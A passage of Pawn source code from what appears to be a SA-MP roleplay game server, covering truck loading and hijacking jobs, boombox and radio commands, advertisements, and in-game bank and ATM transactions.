	SetProgressBarValue(LoadTruckBar[playerid], GetProgressBarValue(LoadTruckBar[playerid])-10.0);
	UpdateProgressBar(LoadTruckBar[playerid], playerid);
	if(GetProgressBarValue(LoadTruckBar[playerid]) > 10) SetTimerEx("HijackTruck", 1000, 0, "d", playerid);

	if(GetProgressBarValue(LoadTruckBar[playerid]) == 50.0)
	{
 		SetProgressBarColor(LoadTruckBar[playerid], COLOR_YELLOW);
   		UpdateProgressBar(LoadTruckBar[playerid], playerid);
	}
	else if(GetProgressBarValue(LoadTruckBar[playerid]) == 20.0)
	{
 		SetProgressBarColor(LoadTruckBar[playerid], COLOR_RED);
		UpdateProgressBar(LoadTruckBar[playerid], playerid);
	}
	else if(GetProgressBarValue(LoadTruckBar[playerid]) <= 10.0)
	{
		DeletePVar(playerid, "IsFrozen");
		TogglePlayerControllable(playerid, 1);
  		DestroyProgressBar(LoadTruckBar[playerid]);
    	LoadTruckBar[playerid] = INVALID_BAR_ID;

        if(!IsPlayerInVehicle(playerid, vehicleid))
        {
       		DestroyProgressBar(LoadTruckBar[playerid]);
			LoadTruckBar[playerid] = INVALID_BAR_ID;
			LoadTruckTime[playerid] = 0;
			DeletePVar(playerid, "TruckDeliver");
			TruckUsed[playerid] = INVALID_VEHICLE_ID;
			gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
 			DisablePlayerCheckpoint(playerid);
            SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You failed to hijack the truck.");
			return 1;
        }


		foreach(Player, i)
		{
  			if(TruckUsed[i] == vehicleid)
  			{
				DestroyProgressBar(LoadTruckBar[i]);
				LoadTruckBar[i] = INVALID_BAR_ID;
				LoadTruckTime[i] = 0;
				DeletePVar(i, "TruckDeliver");
				TruckUsed[i] = INVALID_VEHICLE_ID;
				DisablePlayerCheckpoint(i);
				gPlayerCheckpointStatus[i] = CHECKPOINT_NONE;
 				SendClientMessage(i, COLOR_WHITE, "Your Truck delivery has failed. Your Truck was hijacked.");
			}
		}

  		new truckdeliver = TruckContents[vehicleid];
  		SetPVarInt(playerid, "TruckDeliver", truckdeliver);
  		TruckUsed[playerid] = vehicleid;

		if(truckdeliver == 1)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with food & beverages.");
			SetPlayerCheckpoint(playerid, 812.287231, -1623.678222, 13.546875, 5);
		}
		else if(truckdeliver == 2)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with food & beverages.");
			SetPlayerCheckpoint(playerid, 1204.510375, -920.674499, 43.074016, 5);
		}
		else if(truckdeliver == 3)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with food & beverages.");
			SetPlayerCheckpoint(playerid, 2402.169677, -1502.789306, 23.834865, 5);
		}
		else if(truckdeliver == 4)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with clothing.");
			SetPlayerCheckpoint(playerid, 2110.254394, -1214.892578, 23.485479, 5);
		}
		else if(truckdeliver == 5)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with clothing.");
			SetPlayerCheckpoint(playerid, 1458.425292, -1140.346069, 23.938444, 5);
		}
		else if(truckdeliver == 6)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with clothing.");
			SetPlayerCheckpoint(playerid, 500.889678, -1352.339843, 15.463395, 5);
		}
		else if(truckdeliver == 7)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with materials.");
			SetPlayerCheckpoint(playerid, 334.012207, -1373.775146, 14.230167, 5);
		}
		else if(truckdeliver == 8)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with 24/7 items.");
			SetPlayerCheckpoint(playerid, 1317.785522, -870.413818, 39.089378, 5);
		}
		else if(truckdeliver == 9)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with 24/7 items.");
			SetPlayerCheckpoint(playerid, 1342.577026, -1748.498535, 12.934987, 5);
		}
		else if(truckdeliver == 10)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with 24/7 items.");
			SetPlayerCheckpoint(playerid, 653.629699, -579.503051, 15.889705, 5);
		}
		else if(truckdeliver >= 11 && truckdeliver <= 15)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with weapons.");
			SetPlayerCheckpoint(playerid, 1634.834716, 757.830017, 10.820312, 5);

			new level = PlayerInfo[playerid][pTruckSkill];
			if(level >= 0 && level < 50)
			{ SetPVarInt(playerid, "TruckDeliver", 11); }
			else if(level >= 50 && level < 100)
			{ SetPVarInt(playerid, "TruckDeliver", 12); }
			else if(level >= 100 && level < 200)
			{ SetPVarInt(playerid, "TruckDeliver", 13); }
			else if(level >= 200 && level < 400)
			{ SetPVarInt(playerid, "TruckDeliver", 14); }
			else if(level >= 400)
			{ SetPVarInt(playerid, "TruckDeliver", 15); }
		}
		else if(truckdeliver >= 16 && truckdeliver <= 20)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with drugs.");
			SetPlayerCheckpoint(playerid, 2833.109375, 893.754699, 10.757797, 5);

			new level = PlayerInfo[playerid][pTruckSkill];
			if(level >= 0 && level < 50)
			{ SetPVarInt(playerid, "TruckDeliver", 16); }
			else if(level >= 50 && level < 100)
			{ SetPVarInt(playerid, "TruckDeliver", 17); }
			else if(level >= 100 && level < 200)
			{ SetPVarInt(playerid, "TruckDeliver", 18); }
			else if(level >= 200 && level < 400)
			{ SetPVarInt(playerid, "TruckDeliver", 19); }
			else if(level >= 400)
			{ SetPVarInt(playerid, "TruckDeliver", 20); }
		}
		else if(truckdeliver >= 21 && truckdeliver <= 25)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your hijacked a Truck filled with illegal materials.");
			SetPlayerCheckpoint(playerid, -510.522918, -501.250030, 25.523437, 5);

			new level = PlayerInfo[playerid][pTruckSkill];
			if(level >= 0 && level < 50)
			{ SetPVarInt(playerid, "TruckDeliver", 21); }
			else if(level >= 50 && level < 100)
			{ SetPVarInt(playerid, "TruckDeliver", 22); }
			else if(level >= 100 && level < 200)
			{ SetPVarInt(playerid, "TruckDeliver", 23); }
			else if(level >= 200 && level < 400)
			{ SetPVarInt(playerid, "TruckDeliver", 24); }
			else if(level >= 400)
			{ SetPVarInt(playerid, "TruckDeliver", 25); }
		}

		SendClientMessage(playerid, COLOR_WHITE, "HINT: Deliver the goods to the specified location (see checkpoint on radar).");
		SendClientMessage(playerid, COLOR_REALRED, "WARNING: Watch out for truck hijackers, they can hijack your truck and get away with the goods.");
		if(truckdeliver >= 9)
		{
			SendClientMessage(playerid, COLOR_REALRED, "WARNING #2: you're transporting illegal goods so watch out for law enforcement.");
		}
	}
	return 1;
}

CMD:loadtruck(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 20 || PlayerInfo[playerid][pJob2] == 20)
	{
	    new vehicleid = GetPlayerVehicleID(playerid);
	    if(IsATruckerCar(vehicleid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
	        if(CheckPointCheck(playerid))return SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");

		 	if(GetProgressBarValue(LoadTruckBar[playerid]) > 10)
    		{
      			SendClientMessage(playerid, COLOR_WHITE, "You're currently loading your Truck!");
				return 1;
    		}
      		if(TruckUsed[playerid] != INVALID_VEHICLE_ID)
        	{
         		SendClientMessage(playerid, COLOR_WHITE, "You're already on another delivery, type /cancel truck to cancel that delivery.");
				return 1;
     		}
       		gPlayerCheckpointStatus[playerid] = CHECKPOINT_LOADTRUCK;
         	SetPlayerCheckpoint(playerid,-1578.29, 74.80, 3.55, 5);
          	GameTextForPlayer(playerid, "~w~Waypoint set ~r~Easter Basin", 5000, 1);
           	SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Pick up some goods to transport with your Truck at Easter Basin (see checkpoint on radar).");
	    }
	    else return SendClientMessage(playerid, COLOR_GREY, "You're not driving a Truck!");
	}
	else return SendClientMessage(playerid, COLOR_GREY, "You're not a Trucker!");
	return 1;
}

forward LoadTruck(playerid);
public LoadTruck(playerid)
{
	LoadTruckTime[playerid]--;
	SetProgressBarValue(LoadTruckBar[playerid], GetProgressBarValue(LoadTruckBar[playerid])-10.0);
	UpdateProgressBar(LoadTruckBar[playerid], playerid);
	if(GetProgressBarValue(LoadTruckBar[playerid]) > 10) SetTimerEx("LoadTruck", 1000, 0, "d", playerid);

	if(GetProgressBarValue(LoadTruckBar[playerid]) == 50.0)
	{
 		SetProgressBarColor(LoadTruckBar[playerid], COLOR_YELLOW);
   		UpdateProgressBar(LoadTruckBar[playerid], playerid);
	}
	else if(GetProgressBarValue(LoadTruckBar[playerid]) == 20.0)
	{
 		SetProgressBarColor(LoadTruckBar[playerid], COLOR_RED);
		UpdateProgressBar(LoadTruckBar[playerid], playerid);
	}
	else if(GetProgressBarValue(LoadTruckBar[playerid]) <= 10.0)
	{
		DeletePVar(playerid, "IsFrozen");
		TogglePlayerControllable(playerid, 1);
  		DestroyProgressBar(LoadTruckBar[playerid]);
    	LoadTruckBar[playerid] = INVALID_BAR_ID;

  		new vehicleid = GetPlayerVehicleID(playerid);
  		new truckdeliver = GetPVarInt(playerid, "TruckDeliver");
  		TruckContents[vehicleid] = truckdeliver;
  		TruckUsed[playerid] = vehicleid;

		if(truckdeliver == 1)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with food & beverages.");
			SetPlayerCheckpoint(playerid, 812.287231, -1623.678222, 13.546875, 5);
		}
		else if(truckdeliver == 2)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with food & beverages.");
			SetPlayerCheckpoint(playerid, 1204.510375, -920.674499, 43.074016, 5);
		}
		else if(truckdeliver == 3)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with food & beverages.");
			SetPlayerCheckpoint(playerid, 2402.169677, -1502.789306, 23.834865, 5);
		}
		else if(truckdeliver == 4)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with clothing.");
			SetPlayerCheckpoint(playerid, 2110.254394, -1214.892578, 23.485479, 5);
		}
		else if(truckdeliver == 5)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with clothing.");
			SetPlayerCheckpoint(playerid, 1458.425292, -1140.346069, 23.938444, 5);
		}
		else if(truckdeliver == 6)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with clothing.");
			SetPlayerCheckpoint(playerid, 500.889678, -1352.339843, 15.463395, 5);
		}
		else if(truckdeliver == 7)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with materials.");
			SetPlayerCheckpoint(playerid, 334.012207, -1373.775146, 14.230167, 5);
		}
		else if(truckdeliver == 8)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with 24/7 items.");
			SetPlayerCheckpoint(playerid, 1317.785522, -870.413818, 39.089378, 5);
		}
		else if(truckdeliver == 9)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with 24/7 items.");
			SetPlayerCheckpoint(playerid, 1342.577026, -1748.498535, 12.934987, 5);
		}
		else if(truckdeliver == 10)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with 24/7 items.");
			SetPlayerCheckpoint(playerid, 653.629699, -579.503051, 15.889705, 5);
		}
		else if(truckdeliver >= 11 && truckdeliver <= 15)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with weapons.");
			SetPlayerCheckpoint(playerid, 1634.834716, 757.830017, 10.820312, 5);
		}
		else if(truckdeliver >= 16 && truckdeliver <= 20)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with drugs.");
			SetPlayerCheckpoint(playerid, 2833.109375, 893.754699, 10.757797, 5);
		}
		else if(truckdeliver >= 21 && truckdeliver <= 25)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Your Truck was filled with illegal materials.");
			SetPlayerCheckpoint(playerid, -510.522918, -501.250030, 25.523437, 5);
		}

		SendClientMessage(playerid, COLOR_WHITE, "HINT: Deliver the goods to the specified location (see checkpoint on radar).");
		SendClientMessage(playerid, COLOR_REALRED, "WARNING: Watch out for truck hijackers, they can hijack your truck and get away with the goods.");
		if(truckdeliver >= 11)
		{
			SendClientMessage(playerid, COLOR_REALRED, "WARNING #2: you're transporting illegal goods so watch out for law enforcement.");
		}
		SetPVarInt(playerid, "tpTruckRunTimer", 30);
		SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPTRUCKRUNTIMER);
	}
	return 1;
}

CMD:mp3(playerid, params[])
{
    if(PlayerInfo[playerid][pVip] < 2 && AdminDuty[playerid] == 0)
        return SendClientMessage(playerid, COLOR_WHITE, "You must be at least Silver-VIP to use this feature.");

   	if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

	ShowPlayerDialogEx(playerid, DIALOG_MP3_START, DIALOG_STYLE_LIST, "Radio", "Turn off MP3 player\nSearch by name\nFind by genre", "Select", "Cancel");
    return 1;
}

CMD:placeboombox(playerid, params[]) {
	return cmd_placebb(playerid, params);
}

CMD:placebb(playerid, params[])
{
    if(PlayerInfo[playerid][pVip] < 3)
        return SendClientMessage(playerid, COLOR_WHITE, "You must be at least Gold VIP to use this feature.");

	if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

	if(GetPVarInt(playerid, "EventToken") != 0)
		return SendClientMessage(playerid, COLOR_GREY, "You can't place boomboxes while you're in an event.");

	if(PlayerInfo[playerid][pJailed] > 0)
		return SendClientMessage(playerid, COLOR_GREY, "You can't use this in jail/prison.");

	if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_GREY, "You can't do this while you're in a vehicle.");

	if(GetPlayerInterior(playerid) == 0)
	    return SendClientMessage(playerid, COLOR_GREY, "Boomboxes can only be placed in interiors.");

	if((GetPlayerVirtualWorld(playerid) == 373737 && GetPlayerInterior(playerid) == 37) || (GetPlayerVirtualWorld(playerid) == 363636 && GetPlayerInterior(playerid) == 36) || (GetPlayerVirtualWorld(playerid) == 353535 && GetPlayerInterior(playerid) == 35))
	    return SendClientMessage(playerid, COLOR_GREY, "You can not place a boombox in this interior since there is already music playing here.");

	if(BoomBoxSet[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "You can only place one boombox at a time. Use /pickupbb to remove it.");

	new Float:posX, Float:posY, Float:posZ;
 	GetPlayerPos(playerid, posX, posY, posZ);

	foreach(Player, i)
	{
 		if(IsABoomboxNearby(posX, posY, posZ, i) < 150.0)
			return SendClientMessage(playerid, COLOR_GREY, "There is already a boombox in this interior. Use /pickupbb to remove it.");
	}

	ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_START, DIALOG_STYLE_LIST, "Boombox", "Search by name\nFind by genre", "Select", "Cancel");
	return 1;
}

CMD:pickupboombox(playerid, params[]) {
	return cmd_pickupbb(playerid, params);
}

CMD:pickupbb(playerid, params[])
{
	if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

	if(GetPVarInt(playerid, "EventToken") != 0)
		return SendClientMessage(playerid, COLOR_GREY, "You can't pick up boomboxes while you're in an event.");

	if(PlayerInfo[playerid][pJailed] > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this in jail/prison.");

	if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_GREY, "You can't do this while you're in a vehicle.");

 	if(GetPlayerInterior(playerid) == 0)
	    return SendClientMessage(playerid, COLOR_GREY, "Boomboxes can only be found in interiors.");

	new Float:posX, Float:posY, Float:posZ;
 	GetPlayerPos(playerid, posX, posY, posZ);

 	new iCount;
	foreach(Player, i)
	{
		if(IsABoomboxNearby(posX, posY, posZ, i) < 3.0) {
			if(IsPlayerInRangeOfPoint(i,150.0,BoomboxInfo[i][bbPosX],BoomboxInfo[i][bbPosY],BoomboxInfo[i][bbPosZ]) && GetPlayerInterior(i) == BoomboxInfo[i][bbInt] && GetPlayerVirtualWorld(i) == BoomboxInfo[i][bbVW])
			{
				foreach(Player, x) {
					if(GetDistanceBetweenPlayers(x, i) < 150.0) StopAudioStreamForPlayer(x);
				}
				StopAudioStreamForPlayer(i);
			}

			BoomBoxSet[i] = 0;
			BoomboxInfo[i][bbPosX] = 0.0;
			BoomboxInfo[i][bbPosY] = 0.0;
			BoomboxInfo[i][bbPosZ] = 0.0;
			BoomboxInfo[i][bbInt] = 0;
			BoomboxInfo[i][bbVW] = 0;
			BoomboxInfo[i][bbStation] = 0;
			BoomboxInfo[i][bbSetBy] = 999;
			DestroyDynamicObject(BoomboxInfo[i][bbObject]);
			BoomboxInfo[i][bbObject] = 0;
			iCount++;
		}
	}

	if(iCount == 0) SendClientMessage(playerid, COLOR_GREY, "You are not near any boomboxes.");
	else
	{
	 	ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
		ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);

		new string[128];
		format(string, sizeof(string), "* %s has picked up a Boombox.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}
	return 1;
}

CMD:setstation(playerid, params[]) {
	return cmd_setradio(playerid, params);
}

CMD:setradio(playerid, params[]) {
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
        ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_START, DIALOG_STYLE_LIST, "Radio station", "Turn off radio\nSearch by name\nFind by genre", "Select", "Cancel");
    else SendClientMessage(playerid, COLOR_GRAD1, "You're not driving any vehicle.");

    return 1;
}

CMD:togphone(playerid, params[])
{
	if(PlayerInfo[playerid][pJailed] > 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You can't use your phone in jail/prison.");
		return 1;
	}
	if(!PhoneOnline[playerid])
	{
		PhoneOnline[playerid] = 1;
		SendClientMessage(playerid, COLOR_GRAD2, "Your phone is now switched off.");
	}
	else
	{
		PhoneOnline[playerid] = 0;
		SendClientMessage(playerid, COLOR_GRAD2, "Your phone is now switched on.");
	}
	return 1;
}

CMD:ad(playerid, params[])
{
	return cmd_advertisements(playerid, params);
}

CMD:ads(playerid, params[]) {
	return cmd_advertisements(playerid, params);
}

CMD:advertise(playerid, params[]) {
	return cmd_advertisements(playerid, params);
}

CMD:advertisements(playerid, params[]) {
	if(gPlayerLogged[playerid] == 0) {
		SendClientMessage(playerid, COLOR_GREY, "You're not logged in.");
	}
	else if(GetPVarType(playerid, "Injured")) {
		SendClientMessage(playerid, COLOR_GREY, "You can't use advertisements while injured.");
	}
	else if(PlayerCuffed[playerid] != 0) {
		SendClientMessage(playerid, COLOR_GREY, "You can't use advertisements right now.");
	}
	else if(PlayerInfo[playerid][pJailTime] > 0) {
		SendClientMessage(playerid, COLOR_GREY, "You can't use advertisements while in jail.");
	}
	else ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
	return 1;
}

CMD:awithdraw(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(!IsAtATM(playerid))
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not at an ATM!");
		return 1;
	}
	new string[128], amount;
	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /awithdraw [amount]");
		format(string, sizeof(string), "  You have $%d in your account.", PlayerInfo[playerid][pBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > PlayerInfo[playerid][pBank] || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   You don't have that much!");
		return 1;
	}
	if(PlayerInfo[playerid][pVip] == 0)
	{
		new fee;
		fee = 3*amount/100;
		PlayerInfo[playerid][pBank]=PlayerInfo[playerid][pBank]-fee;
		format(string, sizeof(string), "-$%d money as a 3 percent fee.", fee);
		SendClientMessage(playerid, COLOR_GRAD2, string);
	}

	if(PlayerInfo[playerid][pBank]-amount < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money combined with the ATM charges, go to a bank to withdraw your full amount of money.");

	PlayerInfo[playerid][pBank]=PlayerInfo[playerid][pBank]-amount;
	GivePlayerCash(playerid,amount);
	format(string, sizeof(string), "  You have withdrawn $%d from your account. Current balance: $%d ", amount,PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return 1;
}

CMD:adeposit(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(!IsAtATM(playerid))
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not at an ATM!");
		return 1;
	}
	new string[128], amount;
	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /adeposit [amount]");
		format(string, sizeof(string), "  You have $%d in your account.", PlayerInfo[playerid][pBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > GetPlayerCash(playerid) || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   You don't have that much.");
		return 1;
	}
	if(PlayerInfo[playerid][pVip] == 0)
	{
		new fee;
		fee = 3*amount/100;
		PlayerInfo[playerid][pBank]=PlayerInfo[playerid][pBank]-fee;
		format(string, sizeof(string), "-$%d money (3 percent fee).", fee);
		SendClientMessage(playerid, COLOR_GRAD2, string);
	}
	GivePlayerCash(playerid,-amount);
	new curfunds = PlayerInfo[playerid][pBank];
	PlayerInfo[playerid][pBank]=amount+PlayerInfo[playerid][pBank];
	SendClientMessage(playerid, COLOR_WHITE, "|___ ATM STATMENT ___|");
	format(string, sizeof(string), "  Old Balance: $%d", curfunds);
	SendClientMessage(playerid, COLOR_GRAD2, string);
	format(string, sizeof(string), "  Deposit: $%d",amount);
	SendClientMessage(playerid, COLOR_GRAD4, string);
	SendClientMessage(playerid, COLOR_GRAD6, "|-----------------------------------------|");
	format(string, sizeof(string), "  New Balance: $%d", PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:abalance(playerid, params[])
{
	if(!IsAtATM(playerid))
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not at an ATM!");
		return 1;
	}
	new string[128];
	format(string, sizeof(string), "  You have $%d in your account.",PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return 1;
}

CMD:awiretransfer(playerid, params[])
{
	if(PlayerInfo[playerid][pLevel] < 3)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "   You must be at least level 3!");
		return 1;
	}
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}
	if(!IsAtATM(playerid))
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not at an ATM!");
		return 1;
	}
	new string[128], giveplayerid, amount;
	if(sscanf(params, "ud", giveplayerid, amount)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /awiretransfer [playerid/partofname] [amount]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			new playermoney = PlayerInfo[playerid][pBank];
			if(amount > 0 && playermoney >= amount)
			{
				if(PlayerInfo[playerid][pVip] == 0)
				{
					new fee;
					fee = 3*amount/100;
					PlayerInfo[playerid][pBank]=PlayerInfo[playerid][pBank]-fee;
					format(string, sizeof(string), "-$%d money (3 percent fee).", fee);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				}
				PlayerInfo[playerid][pBank] -= amount;
				PlayerInfo[giveplayerid][pBank] += amount;
				format(string, sizeof(string), "   You have transferred $%d to %s's account.", amount, GetPlayerNameEx(giveplayerid),giveplayerid);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				format(string, sizeof(string), "   You have recieved $%d to into your account from %s.", amount, GetPlayerNameEx(playerid), playerid);
				SendClientMessage(giveplayerid, COLOR_GRAD1, string);
				new ip[32], ipex[32];
				GetPlayerIp(playerid, ip, sizeof(ip));
				GetPlayerIp(giveplayerid, ipex, sizeof(ipex));
				format(string, sizeof(string), "[ATM] %s (IP:%s) has transferred $%d to %s (IP:%s).", GetPlayerNameEx(playerid), ip, amount, GetPlayerNameEx(giveplayerid), ipex);
				if(amount >= 42000)
				{
					ABroadCast(COLOR_YELLOW,string,2);
				}
				Log("logs/pay.log", string);
				PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Invalid transaction amount.");
			}
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	return 1;
}

CMD:withdraw(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the bank!");
		return 1;
	}
	new string[128], amount;

	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /withdraw [amount]");
		format(string, sizeof(string), "  You have $%d in your account.", PlayerInfo[playerid][pBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > PlayerInfo[playerid][pBank] || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   You don't have that much!");
		return 1;
	}
	GivePlayerCash(playerid,amount);
	PlayerInfo[playerid][pBank]=PlayerInfo[playerid][pBank]-amount;
	format(string, sizeof(string), "  You have withdrawn $%d from your account. Current balance: $%d ", amount,PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return 1;
}

CMD:deposit(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the bank!");
		return 1;
	}
	new string[128], amount;

	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /deposit [amount]");
		format(string, sizeof(string), "  You have $%d in your account.", PlayerInfo[playerid][pBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > GetPlayerCash(playerid) || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   You don't have that much.");
		return 1;
	}
	GivePlayerCash(playerid,-amount);
	new curfunds = PlayerInfo[playerid][pBank];
	PlayerInfo[playerid][pBank]=amount+PlayerInfo[playerid][pBank];
	SendClientMessage(playerid, COLOR_WHITE, "|___ BANK STATMENT ___|");
	format(string, sizeof(string), "  Old Balance: $%d", curfunds);
	SendClientMessage(playerid, COLOR_GRAD2, string);
	format(string, sizeof(string), "  Deposit: $%d",amount);
	SendClientMessage(playerid, COLOR_GRAD4, string);
	SendClientMessage(playerid, COLOR_GRAD6, "|-----------------------------------------|");
	format(string, sizeof(string), "  New Balance: $%d", PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:balance(playerid, params[])
{
	new string[128];
	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the bank!");
		return 1;
	}
	format(string, sizeof(string), "You have $%d in your account.",PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return 1;
}

CMD:wiretransfer(playerid, params[])
{
	if(PlayerInfo[playerid][pLevel] < 3)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "   You must be at least level 3!");
		return 1;
	}
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}
	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the bank!");
		return 1;
	}
	new string[128], giveplayerid, amount;
	if(sscanf(params, "ud", giveplayerid, amount)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /wiretransfer [playerid/partofname] [amount]");


	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			new playermoney = PlayerInfo[playerid][pBank] ;
			if(amount > 0 && playermoney >= amount)
			{
